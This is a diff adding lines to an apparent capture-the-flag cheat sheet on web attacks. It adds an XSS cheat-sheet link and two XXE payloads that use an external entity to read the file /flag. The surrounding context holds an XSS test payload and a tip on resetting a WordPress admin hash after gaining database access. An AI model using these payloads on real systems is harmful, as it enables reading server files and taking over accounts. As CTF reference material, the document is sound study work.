@@ -823,6 +823,7 @@ Web
 * [XSS]/[Cross-site scripting]
 
 	[XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet). [Cross-site scripting], vulnerability where the user can control rendered [HTML] and ideally inject [JavaScript] code that could drive a browser to any other website or make any malicious network calls. Example test payload is as follows:
+new usefull XSS cheat sheet : 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet'
 
 ```
 <IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>
@@ -872,7 +873,20 @@ def kcpasswd(ciphertext):
         result += chr(ord(ciphertext[i]) ^ (key[i]))
     return result
 ```
+* XXE : 
+We try to display the content of the file /flag
 
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ELEMENT data (#ANY)>
+<!ENTITY file SYSTEM "file:///flag">
+]>
+<data>&file;</data>
+
+<?xml version="1.0" encoding="UTF-16"?>
+  <!DOCTYPE foo [  
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "file:///flag" >]><foo>&xxe;</foo>
 * Wordpress Password Hash Generator
 
 	If you make it into a Wordpress database and can change passwords, reset the admin password to a new hash: [http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4](http://www.passwordtool.hu/wordpress-password-hash-generator-v3-v4). This will let you login to /wp-admin/ on the site.
